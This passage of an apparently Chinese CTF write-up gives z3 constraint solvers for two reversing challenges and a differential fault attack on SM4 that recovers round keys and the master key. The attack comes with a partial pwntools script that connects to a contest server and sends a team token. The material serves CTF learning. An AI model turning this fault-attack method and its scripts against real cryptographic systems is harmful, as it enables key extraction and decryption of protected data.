</span></span><span class=line><span class=cl>s.add( 117817 * key[5] + 268397 * key[7] + -198175 * key[1] + 18513 * key[2] + 218992 * key[6] + -6727 * key[3] + 228408 * key[0] + 224658 * key[4] == 78775012 )
</span></span><span class=line><span class=cl>s.add(260927 * key[3]+ -5496 * key[1]+ -294195 * key[4]+ 264844 * key[2]+ 125853 * key[5] - 153661 * key[0] == 13075233  )
</span></span><span class=line><span class=cl>s.add( -196269 * key[8] + -64473 * key[7] + -142792 * key[5] + 171321 * key[4] + -39259 * key[9] + -269632 * key[2] + 229049 * key[6] + 96631 * key[3] - 280754 * key[1] - 168397 * key[0] == -70797046 )
</span></span><span class=line><span class=cl>s.add( -235026 * key[4] + 162669 * key[8] + -256202 * key[1] + -32946 * key[9] + -25900 * key[2] + 195039 * key[10] + 182157 * key[3] + 292706 * key[0] + -93524 * key[5] + 121516 * key[6] + 165207 * key[7] == 28263339 )
</span></span><span class=line><span class=cl>s.add( -288418 * key[3] + -218493 * key[7] + -236774 * key[0] + 77982 * key[2] + 190784 * key[4] + -84462 * key[1] + 92684 * key[8] + 52068 * key[5] - 243023 * key[6] == -52520267 )
</span></span><span class=line><span class=cl>s.add( -262820 * key[4] + 9710 * key[10] + 71182 * key[12] + -184125 * key[1] + -100280 * key[6] + 62018 * key[11] + 141532 * key[9] + -138253 * key[8] + 20489 * key[0] + -214348 * key[2] + 162962 * key[3] - 93199 * key[7] + 147171 * key[5] == -31396844 )
</span></span><span class=line><span class=cl>s.add( -131770 * key[6] + -92964 * key[9] + -111160 * key[8] + -258188 * key[7] + 133728 * key[1] + -272650 * key[5] + -4940 * key[10] + 272791 * key[3] + 80519 * key[2] + -165434 * key[11] + 50166 * key[0] + 148713 * key[4] == -22025185 )
</span></span><span class=line><span class=cl>s.add(-55254 * key[8]+ 220404 * key[12]+ -86956 * key[10]+ -200702 * key[5]+ -51437 * key[1]+ 25739 * key[6]+ 122945 * key[3]+ 116256 * key[7]+ 22859 * key[4]+ -61880 * key[9]+ -119275 * key[2]+ -224754 * key[13]- 75412 * key[0]+ 59999 * key[11] == -37063008)
</span></span><span class=line><span class=cl>s.add(111310 * key[0]+ 198502 * key[3]+ -189890 * key[13]+ 278745 * key[5]+ 157462 * key[9]+ 135809 * key[4]+ -2621 * key[2]+ 67553 * key[6]+ 144834 * key[1]+ -88326 * key[11]+ -228149 * key[10]+ 233663 * key[14]+ -249960 * key[12]+ 300012 * key[8]+ 91783 * key[7] == 93457153)
</span></span><span class=line><span class=cl>s.add(15897 * key[0]+ -11943 * key[13]+ 194067 * key[3]+ 125666 * key[2]+ 104421 * key[12]+ -181764 * key[5]+ -233813 * key[8]+ -235783 * key[4]+ 230636 * key[11]+ 148005 * key[6]+ -48167 * key[14]+ -163572 * key[9]+ 54553 * key[10]+ -129997 * key[1]+ 114175 * key[7]- 251681 * key[15] == -36640750)
</span></span><span class=line><span class=cl>s.add( -90549 * key[3]+ -228520 * key[14]+ 34835 * key[10]+ -203538 * key[15]+ 272318 * key[13]+ -68478 * key[8]+ 22454 * key[9]+ 74128 * key[12]+ 70051 * key[6]+ -289940 * key[7]+ -52501 * key[5]+ -1254 * key[4]+ 154844 * key[11]+ 254969 * key[2]+ -39495 * key[1]+ 277429 * key[16]- 132752 * key[0] == -6628237 )
</span></span><span class=line><span class=cl>s.add( 128092 * key[11]+ -5873 * key[17]+ -144172 * key[3]+ -148216 * key[13]+ 189050 * key[2]+ 66107 * key[5]+ 237987 * key[0]+ -53271 * key[9]+ -86968 * key[12]+ -94616 * key[10]+ -247882 * key[8]+ -5107 * key[1]+ 55085 * key[15]+ 10792 * key[14]+ -112241 * key[4]+ -36680 * key[16]- 210718 * key[7]- 249539 * key[6] == -53084017 )
</span></span><span class=line><span class=cl>s.add( -186088 * key[2]+ 19517 * key[13]+ -65515 * key[5]+ 195447 * key[1]+ 145470 * key[14]+ 58825 * key[16]+ 272227 * key[15]+ -155443 * key[8]+ 100397 * key[3]+ -238861 * key[18]+ 84628 * key[7]+ 1337 * key[17]+ 156976 * key[12]+ -74209 * key[4]+ 175077 * key[11]+ 134548 * key[0]+ -280672 * key[6]+ 12264 * key[10] + 56937 * key[9] == 60764977 )
</span></span><span class=line><span class=cl>s.add( -58873 * key[7]+ -283834 * key[9]+ 159144 * key[13]+ -199631 * key[0]+ 54404 * key[16]+ -190345 * key[8]+ 176103 * key[3]+ 137206 * key[17]+ -170051 * key[6]+ 281718 * key[11]+ 137214 * key[14]+ -104395 * key[19]+ -122090 * key[4]+ 162065 * key[15]+ -36580 * key[18]+ 245858 * key[12]+ -18520 * key[10]+ -138274 * key[1]+ 139185 * key[2]- 197535 * key[5] == 4912728 )
</span></span><span class=line><span class=cl>s.add( 293345 * key[9]+ 63329 * key[13]+ 74470 * key[8]+ -72984 * key[11]+ -162393 * key[20]+ 150036 * key[15]+ 127913 * key[19]+ 181147 * key[16]+ 27751 * key[6]+ -239133 * key[1]+ -28337 * key[17]+ 108149 * key[0]+ 148338 * key[2]+ 38137 * key[18]+ -199427 * key[14]+ -97284 * key[4]+ -39775 * key[3]+ -109205 * key[10]+ 270604 * key[5]- 193384 * key[12]+ 168963 * key[7] == 45577809 )
</span></span><span class=line><span class=cl>s.add( 45637 * key[6]+ 111858 * key[17]+ 244009 * key[19]+ -188979 * key[8]+ -220539 * key[16]+ 246135 * key[2]+ -174651 * key[14]+ 179514 * key[4]+ 153071 * key[15]+ -207716 * key[21]+ 64641 * key[7]+ 293781 * key[12]+ 263208 * key[10]+ 44675 * key[1]+ 131692 * key[3]+ 109605 * key[11]+ 293201 * key[5]+ -98937 * key[9]+ 60492 * key[20]+ -273571 * key[13]- 38942 * key[0]- 285946 * key[18] == 77539017 )
</span></span><span class=line><span class=cl>s.add( -160726 * key[9]+ 234971 * key[18]+ 32897 * key[4]+ -206184 * key[11]+ -86224 * key[20]+ 92896 * key[22]+ 295735 * key[15]+ -58530 * key[0]+ -197632 * key[13]+ -21957 * key[17]+ -43684 * key[6]+ -141434 * key[10]+ -194890 * key[1]+ -148390 * key[21]+ 105293 * key[14]+ 76213 * key[3]+ 9791 * key[12]+ -258754 * key[8]+ 59119 * key[16]+ 255675 * key[2]+ -130852 * key[7]- 71444 * key[5]+ 127285 * key[19] == -38197685 )
</span></span><span class=line><span class=cl>s.add( 205675 * key[20]+ 197685 * key[1]+ 144870 * key[4]+ 120347 * key[10]+ 202621 * key[14]+ -236806 * key[17]+ 268813 * key[3]+ 191822 * key[23]+ -40848 * key[6]+ 103466 * key[7]+ -211930 * key[5]+ -180522 * key[19]+ -188959 * key[15]+ -238839 * key[21]+ 281705 * key[11]+ 175825 * key[16]+ -44618 * key[12]+ 196370 * key[0]+ 89330 * key[22]+ -133696 * key[8]+ -60213 * key[2]+ 191404 * key[18]- 291063 * key[9]+ 13902 * key[13] == 67763764 )
</span></span><span class=line><span class=cl>s.add( 69341 * key[15]+ -19740 * key[21]+ 62004 * key[10]+ 29334 * key[8]+ -78459 * key[1]+ -261617 * key[3]+ 115716 * key[22]+ 7838 * key[16]+ -173902 * key[14]+ 115189 * key[9]+ 234832 * key[7]+ -54321 * key[5]+ -268221 * key[20]+ -210563 * key[18]+ -161113 * key[13]+ -199130 * key[23]+ -94067 * key[24]+ 9601 * key[11]+ -8509 * key[12]+ 14439 * key[2]+ -243227 * key[19]+ 37665 * key[17]+ 91076 * key[6]- 85246 * key[0]+ 39558 * key[4] == -98330271 )
</span></span><span class=line><span class=cl>s.add( 38468 * key[19]+ -75568 * key[2]+ 169299 * key[22]+ -252915 * key[3]+ 32044 * key[24]+ -260264 * key[8]+ -111200 * key[1]+ -78437 * key[20]+ -212633 * key[16]+ 180400 * key[5]+ -81477 * key[12]+ 232645 * key[0]+ -65268 * key[4]+ 263000 * key[6]+ 247654 * key[25]+ -242059 * key[17]+ -35931 * key[9]+ -271816 * key[21]+ 10191 * key[13]+ 41768 * key[23]+ 92844 * key[7]+ -73366 * key[14]+ -124307 * key[10]+ 197710 * key[18]+ 226192 * key[15]+ 3788 * key[11] == -13464859 )
</span></span><span class=line><span class=cl>s.add( -23897 * key[9]+ -188087 * key[24]+ -254282 * key[15]+ -102361 * key[23]+ -15606 * key[14]+ -74795 * key[21]+ 116581 * key[12]+ 77693 * key[5]+ -6866 * key[25]+ 215574 * key[22]+ 231326 * key[6]+ 77915 * key[2]+ 186585 * key[3]+ 219151 * key[4]+ 271210 * key[13]+ -78913 * key[20]+ 83918 * key[8]+ -153409 * key[18]+ -84952 * key[7]+ -121854 * key[0]+ -253617 * key[26]+ -213665 * key[19]+ -293146 * key[17]+ -166693 * key[16]+ -206964 * key[1]- 155664 * key[10]+ 180598 * key[11] == -55504393 )
</span></span><span class=line><span class=cl>s.add( 264405 * key[11]+ 135302 * key[12]+ 278196 * key[9]+ -132906 * key[23]+ 138308 * key[7]+ 40423 * key[21]+ 157781 * key[0]+ -38949 * key[27]+ -143324 * key[14]+ -120743 * key[10]+ 77375 * key[5]+ -164339 * key[3]+ 167370 * key[25]+ -225830 * key[4]+ -136952 * key[2]+ -14347 * key[8]+ 6966 * key[26]+ 88628 * key[18]+ 138998 * key[22]+ 147747 * key[19]+ -106792 * key[6]+ -113009 * key[20]+ 98136 * key[15]+ 231264 * key[24]+ -109447 * key[17]+ 258890 * key[1]+ 167885 * key[16]+ 246315 * key[13] == 133068723 )
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>flag = &#39;&#39;
</span></span><span class=line><span class=cl>if s.check() == sat:
</span></span><span class=line><span class=cl>    result = s.model()
</span></span><span class=line><span class=cl>    print s.model()
</span></span><span class=line><span class=cl>    for i in range(28):
</span></span><span class=line><span class=cl>        flag += chr(result[key[i]].as_long().real)
</span></span><span class=line><span class=cl>    print flag
</span></span><span class=line><span class=cl>    print len(&#39;flag{g0_Fuck_xx_5egm3nt&#39;)
</span></span></code></pre></td></tr></table></div></div><h3 id=imitation_game>imitation_game</h3><p>fork后子进程是一个CBC AES，正确后，父进程启动了一个chip8程序，这里的字节码进行过更改，打log后，分析，是一个</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>v0
</span></span><span class=line><span class=cl>+2
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>v1
</span></span><span class=line><span class=cl>+1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>v2
</span></span><span class=line><span class=cl>+1
</span></span><span class=line><span class=cl>xor 1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*********
</span></span><span class=line><span class=cl>v3
</span></span><span class=line><span class=cl>+3
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>v4
</span></span><span class=line><span class=cl>+2
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>v5
</span></span><span class=line><span class=cl>xor 2
</span></span><span class=line><span class=cl>+1
</span></span><span class=line><span class=cl>***********
</span></span><span class=line><span class=cl>v6
</span></span><span class=line><span class=cl>*2
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>v7
</span></span><span class=line><span class=cl>+1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>v8
</span></span><span class=line><span class=cl>xor 1
</span></span><span class=line><span class=cl>+1
</span></span><span class=line><span class=cl>*************
</span></span><span class=line><span class=cl>v9
</span></span><span class=line><span class=cl>+2
</span></span></code></pre></td></tr></table></div></div><p>先对输入做上面的操作
然后进入27a这个乘法
俩个参数，一个输入一个乘法系数
1 2 1
2 1 1
1 2 2
系输如上，三组循环，解方程即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># -*- coding: UTF-8 -*-
</span></span><span class=line><span class=cl>from z3 import *
</span></span><span class=line><span class=cl>s = Solver()
</span></span><span class=line><span class=cl>key = [BitVec(&#39;%d&#39;%i,8) for i in range(3)]
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>s.add(key[0]+2*key[1]+key[2] == 0x37)
</span></span><span class=line><span class=cl>s.add(2*key[0]+key[1]+key[2] == 0x37)
</span></span><span class=line><span class=cl>s.add(key[0]+2*key[1]+2*key[2] == 0x3b)
</span></span><span class=line><span class=cl>flag = &#39;&#39;
</span></span><span class=line><span class=cl>if s.check() == sat:
</span></span><span class=line><span class=cl>    print s.model()
</span></span><span class=line><span class=cl>aaa = [10,2,13,14,15,1,2,12,1,3]
</span></span><span class=line><span class=cl>flag = &#39;flag{6c8f1d78770fe672122478c6f9a150e6&#39;
</span></span><span class=line><span class=cl>for i in range(len(aaa)):
</span></span><span class=line><span class=cl>    flag += str(hex(aaa[i]).replace(&#39;0x&#39;,&#39;&#39;))
</span></span><span class=line><span class=cl>flag += &#39;}&#39;
</span></span><span class=line><span class=cl>print flag
</span></span></code></pre></td></tr></table></div></div><p>算出来是a2def12c13</p><h2 id=crypto>Crypto</h2><h3 id=fault>fault</h3><p>differential fault attack SM4</p><p>找paper：</p><p>Min WANG,Zhen WU,Jin-tao RAO,Hang LING. Round reduction-based fault attack on SM4 algorithm[J]. Journal on Communications, 2016, 37(Z1): 98-103.</p><p>这篇不太行，直接把最后的几轮给扔了，不太realistic；不过从中学到了SM4的构造，以及SM4的DFA相关研究</p><p>找到了https://eprint.iacr.org/2010/063.pdf</p><blockquote><p>We show that if a random byte fault is induced into either the second, third or fourth word register at the input of the 28-th round, the 128-bit master key could be derived with an exhaustive search of 22.11 bits on average.</p></blockquote><p>28轮的第2、3、4个寄存器出错，可以直接整出master key，很对头，但是有点难理解</p><blockquote><p>The procedure of the round-key generation indicates that the master key can be easily retrieved from any four consecutive round-keys.</p></blockquote><p>然后几个paper轮流看。</p><p><img src=https://hackmd.summershrimp.com/uploads/upload_bbc71b52cfdefddb249b337787f0c652.png alt></p><p>选择了需要fault次数最多的那个方法。（因为容易理解一些</p><p>paper：https://wenku.baidu.com/view/df86818e79563c1ec5da71c4.html</p><p>出题人没整好输入的round（只能在第2～31轮注入fault， 而非1～32轮），所以操作的时候就稍微需要自己改变一下</p><p><img src=https://hackmd.summershrimp.com/uploads/upload_ee8ac49c5879017f86dfc47f2778e39c.png alt></p><p>往第31轮的X30上注入1byte的fault，将会导致第32轮的X34的差分值有1byte不为0。</p><p>然后往F函数里面日：</p><p><img src=https://hackmd.summershrimp.com/uploads/upload_944a8f9c6845bac7c504f38481822778.png alt></p><p>可以激活一个sbox：必有一个sbox的差分值不为0（其他3个sbox均为0），且这个sbox的位置可控；这个sbox的两个差分输入r_inp, f_inp 也能确定下来。</p><blockquote><p>r_byte: raw input byte
f_byte: fault input byte</p></blockquote><p>再来从下往上看这个sbox输出的差分值：</p><p><img src=https://hackmd.summershrimp.com/uploads/upload_e1c2ffc280b41e4a1e98b99227cd24d9.png alt></p><p>paper里有具体的分析，看不懂，直接看到结论。这个结论就是说sbox输出的差分值diff_out也能确定下来。</p><p>ok，然后穷举这个sbox所对应那一byte子密钥rk_byte（仅256种可能，一个子密钥有4byte，每1byte对应一个sbox），计算sbox(r_inp ^ rk_byte) ^ sbox(f_inp ^ rk_byte)，看是否等于diff_out，如果等于就说明这个byte可以作为备选子密钥byte（理论值是说这边有2.0236个可能的candidate子密钥byte）。两次这么操作后，基本上就可以确定下这个byte到底是哪一个了。</p><p>然后这么再去另外3个sbox对应的位置处注入fault，即可恢复出这第32轮的4byte子密钥。</p><p>恢复出来后，可以解密一轮来到第31轮，往第30轮的X29处注入fault，等价于往第31轮的X33处注入，然后同样的操作，可以恢复这第31轮的子密钥。</p><p>再恢复2轮，即可得到第30、29轮的子密钥。</p><p>key schedule可逆，能通过这最后4轮的子密钥直接搞到master key</p><p>最后解密，getflag</p><p>脚本很乱：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>collections</span> <span class=kn>import</span> <span class=n>Counter</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>itertools</span> <span class=kn>import</span> <span class=n>product</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>sha256</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>sm4</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>func</span> <span class=kn>import</span> <span class=n>xor</span><span class=p>,</span> <span class=n>rotl</span><span class=p>,</span> <span class=n>get_uint32_be</span><span class=p>,</span> <span class=n>put_uint32_be</span><span class=p>,</span> \
</span></span><span class=line><span class=cl>        <span class=n>bytes_to_list</span><span class=p>,</span> <span class=n>list_to_bytes</span><span class=p>,</span> <span class=n>padding</span><span class=p>,</span> <span class=n>unpadding</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>token</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;icq3f18237ca27013a7969864ab40836&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;39.101.134.52&#34;</span><span class=p>,</span> <span class=mi>8006</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># context.log_level = &#39;debug&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># PoW</span>
</span></span><span class=line><span class=cl><span class=n>rec</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>suffix</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;XXX\+([^\)]+)&#39;</span><span class=p>,</span> <span class=n>rec</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>digest</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;== ([^\n]+)&#39;</span><span class=p>,</span> <span class=n>rec</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;suffix: </span><span class=si>{</span><span class=n>suffix</span><span class=si>}</span><span class=s2> </span><span class=se>\n</span><span class=s2>digest: </span><span class=si>{</span><span class=n>digest</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Calculating hash...&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>product</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_letters</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span><span class=p>,</span> <span class=n>repeat</span><span class=o>=</span><span class=mi>3</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>prefix</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>guess</span> <span class=o>=</span> <span class=n>prefix</span> <span class=o>+</span> <span class=n>suffix</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>sha256</span><span class=p>(</span><span class=n>guess</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span> <span class=o>==</span> <span class=n>digest</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>guess</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Give me XXX:&#39;</span><span class=p>,</span> <span class=n>prefix</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;teamtoken&#34;</span><span class=p>,</span> <span class=n>token</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;your flag is</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>enc_flag</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>enc_flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>plaintext</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=mi>15</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ltor</span><span class=p>(</span><span class=n>b</span><span class=p>,</span> <span class=n>l</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>bits</span> <span class=o>=</span> <span class=nb>bin</span><span class=p>(</span><span class=n>b</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>int</span><span class=p>(</span><span class=n>bits</span><span class=p>[</span><span class=o>-</span><span class=n>l</span><span class=p>:]</span> <span class=o>+</span> <span class=n>bits</span><span class=p>[:</span><span class=o>-</span><span class=n>l</span><span class=p>],</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>inv_Y</span><span class=p>(</span><span class=n>cipher</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># bytes -&gt; list</span>
</span></span><span class=line><span class=cl>    <span class=n>Y0</span> <span class=o>=</span> <span class=n>get_uint32_be</span><span class=p>(</span><span class=n>cipher</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>4</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>Y1</span> <span class=o>=</span> <span class=n>get_uint32_be</span><span class=p>(</span><span class=n>cipher</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>8</span><span class=p>])</span>
